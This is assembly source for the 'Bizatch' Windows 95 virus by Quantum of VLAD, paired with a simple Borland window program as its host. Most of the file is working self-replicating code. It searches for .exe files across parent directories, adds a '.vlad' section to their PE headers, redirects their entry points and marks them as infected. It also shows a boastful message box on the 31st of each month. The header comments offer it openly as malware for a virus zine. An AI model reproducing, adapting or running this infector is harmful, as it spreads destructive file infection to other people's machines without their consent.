;
; Bizatch by Quantum / VLAD
;
; Welcome to the world's first Windows 95 virus.
;
; It is a great honour for me to have written this virus as this
; is ground breaking stuff.  Windows 95 is a platform that was
; designed to be uninfectable, but Microsoft did not reckon with
; the awesome power of vlad.  As such, this virus will be used as
; a minor information service for vlad.  On the 31st of every month
; every infected exe will display a message box listing the members
; of the vlad possie from the old skool to the new.
;
; The following is a host program kindly contributed by Borland International.
; This example will put up a window and beep when the right mouse button
; is pressed.  When the left mouse button is pressed, it will increment
; the displayed 32-bit counter.
;
; Everything needed to assemble this code has been put in the file
; BIZATCH.ZIP
;
; A tutorial on Win95 virii is likely to be included in this issue of vlad.
;
;-----------------------------------------------------------------------------
; You might wanna skip over this and head straight for the virus code
; which is at line 350
;
.386
locals
jumps
.model flat,STDCALL
include win32.inc           ; some 32-bit constants and structures

L equ <LARGE>

;
; Define the external functions we will be linking to
;
extrn            BeginPaint:PROC
extrn            CreateWindowExA:PROC
extrn            DefWindowProcA:PROC
extrn            DispatchMessageA:PROC
extrn            EndPaint:PROC
extrn            ExitProcess:PROC
extrn            FindWindowA:PROC
extrn            GetMessageA:PROC
extrn            GetModuleHandleA:PROC
extrn            GetStockObject:PROC
extrn            InvalidateRect:PROC
extrn            LoadCursorA:PROC
extrn            LoadIconA:PROC
extrn            MessageBeep:PROC
extrn            PostQuitMessage:PROC
extrn            RegisterClassA:PROC
extrn            ShowWindow:PROC
extrn            SetWindowPos:PROC
extrn            TextOutA:PROC
extrn            TranslateMessage:PROC
extrn            UpdateWindow:PROC

;
; for Unicode support, Win32 remaps some functions to either the Ansi or
; Wide char versions.  We will assume Ansi for this example.
;
CreateWindowEx   equ <CreateWindowExA>
DefWindowProc    equ <DefWindowProcA>
DispatchMessage  equ <DispatchMessageA>
FindWindow       equ <FindWindowA>
GetMessage       equ <GetMessageA>
GetModuleHandle  equ <GetModuleHandleA>
LoadCursor       equ <LoadCursorA>
LoadIcon         equ <LoadIconA>
MessageBox       equ <MessageBoxA>
RegisterClass    equ <RegisterClassA>
TextOut          equ <TextOutA>

.data
copyright        db 'VLAD inc - 1995, peace through superior virus power..',0

newhwnd          dd 0
lppaint          PAINTSTRUCT <?>
msg              MSGSTRUCT   <?>
wc               WNDCLASS    <?>
mbx_count        dd 0

hInst            dd 0

szTitleName      db 'Bizatch by Quantum / VLAD activated'
zero             db 0
szAlternate      db 'more than once',0
szClassName      db 'ASMCLASS32',0
szPaint          db 'Left Button pressed:'
s_num            db '00000000h times.',0
MSG_L EQU ($-offset szPaint)-1

.code
;-----------------------------------------------------------------------------
;
; This is where control is usually received from the loader.
;
start:

        push    L 0
        call    GetModuleHandle         ; get hmod (in eax)
        mov     [hInst], eax            ; hInstance is same as HMODULE
                                        ; in the Win32 world

        push    L 0
        push    offset szClassName
        call    FindWindow
        or      eax,eax
        jz      reg_class

        mov     [zero], ' '             ; space to modify title string

reg_class:
;
; initialize the WndClass structure
;
        mov     [wc.clsStyle], CS_HREDRAW + CS_VREDRAW + CS_GLOBALCLASS
        mov     [wc.clsLpfnWndProc], offset WndProc
        mov     [wc.clsCbClsExtra], 0
        mov     [wc.clsCbWndExtra], 0

        mov     eax, [hInst]
        mov     [wc.clsHInstance], eax

        push    L IDI_APPLICATION
        push    L 0
        call    LoadIcon
        mov     [wc.clsHIcon], eax

        push    L IDC_ARROW
        push    L 0
        call    LoadCursor
        mov     [wc.clsHCursor], eax

        mov     [wc.clsHbrBackground], COLOR_WINDOW + 1
        mov     dword ptr [wc.clsLpszMenuName], 0
        mov     dword ptr [wc.clsLpszClassName], offset szClassName

        push    offset wc
        call    RegisterClass

        push    L 0                      ; lpParam
        push    [hInst]                  ; hInstance
        push    L 0                      ; menu
        push    L 0                      ; parent hwnd
        push    L CW_USEDEFAULT          ; height
        push    L CW_USEDEFAULT          ; width
        push    L CW_USEDEFAULT          ; y
        push    L CW_USEDEFAULT          ; x
        push    L WS_OVERLAPPEDWINDOW    ; Style
        push    offset szTitleName       ; Title string
        push    offset szClassName       ; Class name
        push    L 0                      ; extra style

        call    CreateWindowEx

        mov     [newhwnd], eax

        push    L SW_SHOWNORMAL
        push    [newhwnd]
        call    ShowWindow

        push    [newhwnd]
        call    UpdateWindow

msg_loop:
        push    L 0
        push    L 0
        push    L 0
        push    offset msg
        call    GetMessage

        cmp     ax, 0
        je      end_loop

        push    offset msg
        call    TranslateMessage

        push    offset msg
        call    DispatchMessage

        jmp     msg_loop

end_loop:
        push    [msg.msWPARAM]
        call    ExitProcess

        ; we never get to here

;-----------------------------------------------------------------------------
WndProc          proc uses ebx edi esi, hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD
;
; WARNING: Win32 requires that EBX, EDI, and ESI be preserved!  We comply
; with this by listing those regs after the 'uses' statement in the 'proc'
; line.  This allows the Assembler to save them for us.
;
        LOCAL   theDC:DWORD

        cmp     [wmsg], WM_DESTROY
        je      wmdestroy
        cmp     [wmsg], WM_RBUTTONDOWN
        je      wmrbuttondown
        cmp     [wmsg], WM_SIZE
        je      wmsize
        cmp     [wmsg], WM_CREATE
        je      wmcreate
        cmp     [wmsg], WM_LBUTTONDOWN
        je      wmlbuttondown
        cmp     [wmsg], WM_PAINT
        je      wmpaint
        cmp     [wmsg], WM_GETMINMAXINFO
        je      wmgetminmaxinfo


        jmp     defwndproc

wmpaint:
        push    offset lppaint
        push    [hwnd]
        call    BeginPaint
        mov     [theDC], eax

        mov     eax, [mbx_count]
        mov     edi, offset s_num
        call    HexWrite32

        push    L MSG_L           ; length of string
        push    offset szPaint    ; string
        push    L 5               ; y
        push    L 5               ; x
        push    [theDC]           ; the DC
        call    TextOut

        push    offset lppaint
        push    [hwnd]
        call    EndPaint

        mov     eax, 0
        jmp     finish

wmcreate:
        mov     eax, 0
        jmp     finish

defwndproc:
        push    [lparam]
        push    [wparam]
        push    [wmsg]
        push    [hwnd]
        call    DefWindowProc
        jmp     finish

wmdestroy:
        push    L 0
        call    PostQuitMessage
        mov     eax, 0
        jmp     finish

wmlbuttondown:
        inc     [mbx_count]

        push    L 0
        push    L 0
        push    [hwnd]
        call    InvalidateRect    ; repaint window

        mov     eax, 0
        jmp     finish

wmrbuttondown:
        push    L 0
        call    MessageBeep
        jmp     finish

wmsize:
        mov     eax, 0
        jmp     finish

wmgetminmaxinfo:

        mov     ebx, [lparam]  ; ptr to minmaxinfo struct
        mov     [(MINMAXINFO ptr ebx).mintrackposition_x] , 350
        mov     [(MINMAXINFO ptr ebx).mintrackposition_y] , 60
        mov     eax, 0
        jmp     finish

finish:
        ret
WndProc          endp
;-----------------------------------------------------------------------------
HexWrite8 proc
;
; AL has two hex digits that will be written to ES:EDI in ASCII form
;

        mov     ah, al
        and     al, 0fh
        shr     ah, 4
                                ; ah has MSD
                                ; al has LSD
        or      ax, 3030h
        xchg    al, ah
        cmp     ah, 39h
        ja      @@4
@@1:
        cmp     al, 39h
        ja      @@3
@@2:
        stosw
        ret
@@3:
        sub     al, 30h
        add     al, 'A' - 10
        jmp     @@2
@@4:
        sub     ah, 30h
        add     ah, 'A' - 10
        jmp     @@1
HexWrite8 endp
;-----------------------------------------------------------------------------
HexWrite16 proc
;
; AX has four hex digits in it that will be written to ES:EDI
;
        push    ax
        xchg    al,ah
        call    HexWrite8
        pop     ax
        call    HexWrite8
        ret
HexWrite16 endp
;-----------------------------------------------------------------------------
HexWrite32 proc
;
; EAX has eight hex digits in it that will be written to ES:EDI
;
        push    eax
        shr     eax, 16
        call    HexWrite16
        pop     eax
        call    HexWrite16
        ret
HexWrite32 endp
;-----------------------------------------------------------------------------
public WndProc
ends
;-----------------------------------------------------------------------------
;  Here is where the virus code begins.. this code is moved from exe to
;  exe.. the above is just a simple custom host.

vladseg segment para public 'vlad'
assume cs:vladseg
vstart:
call recalc
recalc:
pop ebp
mov eax,ebp                            ; calculate the address to the host
db 2dh
subme dd 30000h + (recalc - vstart)
push eax                               ; save it for l8r
sub ebp,offset recalc                  ; calculate the delta offset

mov eax,[ebp + offset kern2]           ; determine where the kernel is at
cmp dword ptr [eax],5350fc9ch
jnz notkern2
mov eax,[ebp + offset kern2]           ; here
jmp movit
notkern2:
mov eax,[ebp + offset kern1]           ; or here
cmp dword ptr [eax],5350fc9ch
jnz nopayload
mov eax,[ebp + offset kern1]
movit:
mov [ebp + offset kern],eax            ; save it for l8r use

cld                                    ; important
lea eax,[ebp + offset orgdir]
push eax
push 255
call GetCurDir                         ; save the current directory

mov byte ptr [ebp + offset countinfect],0 ; count the number we are infecting

infectdir:

lea eax,[ebp + offset win32_data_thang]
push eax
lea eax,[ebp + offset fname]
push eax
call FindFile                             ; search for first exe

mov dword ptr [ebp + offset searchhandle],eax   ; save the search handle
cmp eax,-1
jz foundnothing

gofile:

push 0
push dword ptr [ebp + offset fileattr]  ; FILE_ATTRIBUTE_NORMAL
push 3 ; OPEN_EXISTING
push 0
push 0
push 80000000h + 40000000h ; GENERIC_READ + GENERIC_WRITE
lea eax,[ebp + offset fullname]
push eax
call CreateFile             ; open file in read/write mode

mov dword ptr [ebp + offset ahand],eax   ; save the handle
cmp eax,-1
jz findnextone

; goto the dword that stores the location of the pe header
push 0
push 0
push 3ch
push dword ptr [ebp + offset ahand]
call SetFilePointer

; read in the location of the pe header
push 0
lea eax,[ebp + offset bytesread]
push eax
push 4
lea eax,[ebp + offset peheaderoffset]
push eax
push dword ptr [ebp + offset ahand]
call ReadFile

; goto the pe header
push 0
push 0
push dword ptr [ebp + offset peheaderoffset]
push dword ptr [ebp + offset ahand]
call SetFilePointer

; read in enuff to calculate the full size of the pe header and object table
push 0
lea eax,[ebp + offset bytesread]
push eax
push 58h
lea eax,[ebp + offset peheader]
push eax
push dword ptr [ebp + offset ahand]
call ReadFile

; make sure it is a pe header and is not already infected
cmp dword ptr [ebp + offset peheader],00004550h    ; PE,0,0
jnz notape
cmp word ptr [ebp + offset peheader + 4ch],0F00Dh
jz notape
cmp dword ptr [ebp + offset 52],4000000h
jz notape

; go back to the start of the pe header
push 0
push 0
push dword ptr [ebp + offset peheaderoffset]
push dword ptr [ebp + offset ahand]
call SetFilePointer

; read in the whole pe header and object table
push 0
lea eax,[ebp + offset bytesread]
push eax
push dword ptr [ebp + offset headersize]
lea eax,[ebp + offset peheader]
push eax
push dword ptr [ebp + offset ahand]
call ReadFile

; set the infection flag
mov word ptr [ebp + offset peheader + 4ch],0F00Dh

; locate offset of object table
xor eax,eax
mov ax, word ptr [ebp + offset NtHeaderSize]
add eax,18h
mov dword ptr [ebp + offset ObjectTableoffset],eax

; calculate the offset of the last (null) object in the object table
mov esi,dword ptr [ebp + offset ObjectTableoffset]
lea eax,[ebp + offset peheader]
add esi,eax
xor eax,eax
mov ax,[ebp + offset numObj]
mov ecx,40
xor edx,edx
mul ecx
add esi,eax

inc word ptr [ebp + offset numObj]    ; inc the number of objects

lea edi,[ebp + offset newobject]
xchg edi,esi

; calculate the Relative Virtual Address (RVA) of the new object
mov eax,[edi-5*8+8]
add eax,[edi-5*8+12]
mov ecx,dword ptr [ebp + offset objalign]
xor edx,edx
div ecx
inc eax
mul ecx
mov dword ptr [ebp + offset RVA],eax

; calculate the physical size of the new object
mov ecx,dword ptr [ebp + offset filealign]
mov eax,vend-vstart
xor edx,edx
div ecx
inc eax
mul ecx
mov dword ptr [ebp + offset physicalsize],eax

; calculate the virtual size of the new object
mov ecx,dword ptr [ebp + offset objalign]
mov eax,vend - vstart + 1000h
xor edx,edx
div ecx
inc eax
mul ecx
mov dword ptr [ebp + offset virtualsize],eax

; calculate the physical offset of the new object
mov eax,[edi-5*8+20]
add eax,[edi-5*8+16]
mov ecx,dword ptr [ebp + offset filealign]
xor edx,edx
div ecx
inc eax
mul ecx
mov dword ptr [ebp + offset physicaloffset],eax

; update the image size (the size in memory) of the file
mov eax,vend-vstart+1000h
add eax,dword ptr [ebp + offset imagesize]
mov ecx,[ebp + offset objalign]
xor edx,edx
div ecx
inc eax
mul ecx
mov dword ptr [ebp + offset imagesize],eax

; copy the new object into the object table
mov ecx,10
rep movsd

; calculate the entrypoint RVA
mov eax,dword ptr [ebp + offset RVA]

mov ebx,dword ptr [ebp + offset entrypointRVA]
mov dword ptr [ebp + offset entrypointRVA],eax

sub eax,ebx
add eax,5

; Set the value needed to return to the host
mov dword ptr [ebp + offset subme],eax

; go back to the start of the pe header
push 0
push 0
push dword ptr [ebp + offset peheaderoffset]
push dword ptr [ebp + offset ahand]
call SetFilePointer

; write the pe header and object table to the file
push 0
lea eax,[ebp + offset bytesread]
push eax
push dword ptr [ebp + offset headersize]
lea eax,[ebp + offset peheader]
push eax
push dword ptr [ebp + offset ahand]
call WriteFile

; increase the number of files infected
inc byte ptr [ebp + offset countinfect]

; move to the physical offset of the new object
push 0
push 0
push dword ptr [ebp + offset physicaloffset]
push dword ptr [ebp + offset ahand]
call SetFilePointer

; write the virus code to the new object
push 0
lea eax,[ebp + offset bytesread]
push eax
push vend-vstart
lea eax,[ebp + offset vstart]
push eax
push dword ptr [ebp + offset ahand]
call WriteFile

notape:

; close the file
push dword ptr [ebp + offset ahand]
call CloseFile

findnextone:

; have we infected 3 ?
cmp byte ptr [ebp + offset countinfect],3
jz outty

; no.. find the next file
lea eax,[ebp + offset win32_data_thang]
push eax
push dword ptr [ebp + offset searchhandle]
call FindNext

; is there a next ? yes.. infect it
or eax,eax
jnz gofile

foundnothing:

; no .. change dirs
xor eax,eax
lea edi,[ebp + offset tempdir]
mov ecx,256/4
rep stosd
lea edi,[ebp + offset tempdir1]
mov ecx,256/4
rep stosd

; get the current dir
lea esi,[ebp + offset tempdir]
push esi
push 255
call GetCurDir

; change into ".."
lea eax,[ebp + offset dotdot]
push eax
call SetCurDir

; get the current dir
lea edi,[ebp + offset tempdir1]
push edi
push 255
call GetCurDir

; if the dirs are the same then the ".." failed
mov ecx,256/4
rep cmpsd
jnz infectdir

outty:

; set the current dir back to the original
lea eax,[ebp + offset orgdir]
push eax
call SetCurDir

; get the current date and time and lots of other shit that no-one ever uses
lea eax,[ebp + offset systimestruct]
push eax
call GetTime

; if it's the 31st then do the payload
cmp word ptr [ebp + offset day],31
jnz nopayload

; display a message box to the user
push  1000h ; MB_SYSTEMMODAL
lea eax,[ebp + offset boxtitle]
push eax
lea eax,[ebp + offset boxmsg]
push eax
push 0
call MsgBox

nopayload:

; jump back to the host
pop eax
jmp eax

kern dd 0BFF93B95h       ; the value of the kernel will be shoved in here
kern1 dd 0BFF93B95h      ; the first possible value of the kernel
kern2 dd 0BFF93C1Dh      ; the second possible value of the kernel

GetCurDir:
push 0BFF77744h               ; push this value to get current dir
jmp [ebp + offset kern]

SetCurDir:
push 0BFF7771Dh               ; push this value to set current dir
jmp [ebp + offset kern]

GetTime:
cmp [ebp + offset kern],0BFF93B95h
jnz gettimekern2
push 0BFF9D0B6h    ; push this value if we're using kernel1 to get time/date
jmp [ebp + offset kern]
gettimekern2:
push 0BFF9D14eh    ; push this value if we're using kernel2 to get time/date
jmp [ebp + offset kern]

MsgBox:
push 0BFF638D9h    ; push this value to display a message box
jmp [ebp + offset kern]

FindFile:
push 0BFF77893h       ; push this value to find a file
jmp [ebp + offset kern]

FindNext:
push 0BFF778CBh       ; push this value to find the next file
jmp [ebp + offset kern]

CreateFile:
push 0BFF77817h       ; push this value to create/open a file (create handle)
jmp [ebp + offset kern]

SetFilePointer:
push 0BFF76FA0h       ; push this value to set the file pointer of a file
jmp [ebp + offset kern]

ReadFile:
push 0BFF75806h       ; push this value to read a file
jmp [ebp + offset kern]

WriteFile:
push 0BFF7580Dh       ; push this value to write to a file
jmp [ebp + offset kern]

CloseFile:
push 0BFF7BC72h       ; push this value to close a file
jmp [ebp + offset kern]

countinfect db 0           ; counts the infections

win32_data_thang:            ; used to search for files
fileattr dd 0
createtime dd 0,0
lastaccesstime dd 0,0
lastwritetime dd 0,0
filesize dd 0,0
resv dd 0,0
fullname db 256 dup (0)
realname db 256 dup (0)

boxtitle db "Bizatch by Quantum / VLAD",0
boxmsg db "The taste of fame just got tastier!",0dh
       db "VLAD Australia does it again with the world's first Win95 Virus"
       db 0dh,0dh
       db 9,"From the old school to the new..               ",0dh,0dh
       db 9,"Metabolis",0dh
       db 9,"Qark",0dh
       db 9,"Darkman",0dh
       db 9,"Quantum",0dh
       db 9,"CoKe",0

messagetostupidavers db "Please note: the name of this virus is [Bizatch]"
db " written by Quantum of VLAD",0

orgdir db 256 dup (0)
tempdir db 256 dup (0)
tempdir1 db 256 dup (0)
dotdot db "..",0

systimestruct:                 ; used to get the time/date
dw 0,0,0
day dw 0
dw 0,0,0,0

searchhandle dd 0            ; used in searches for files
fname db '*.exe',0           ; spec to search for
ahand dd 0                   ; handle of the file we open
peheaderoffset dd 0          ; stores the offset of the peheader in the file
ObjectTableoffset dd 0       ; stores the offset of the object table in memory
bytesread dd 0               ; number of bytes we just read/wrote from/to the file

newobject:                   ; the new object
oname db ".vlad",0,0,0
virtualsize    dd 0
RVA            dd 0
physicalsize   dd 0
physicaloffset dd 0
reserved dd 0,0,0
objectflags    db 40h,0,0,0c0h

peheader:                ; essential data for infecting the pe header
signature dd 0
cputype dw 0
numObj dw 0
db 3*4 dup (0)
NtHeaderSize dw 0
Flags dw 0
db 4*4 dup (0)
entrypointRVA dd 0
db 3*4 dup (0)
objalign dd 0
filealign dd 0
db 4*4 dup (0)
imagesize dd 0
headersize dd 0
vend:
; space to read in the rest of the pe header and object table
; not actually written to the file but allocated by the object in post beta gen
db 1000h dup (0)
ends
end vstart



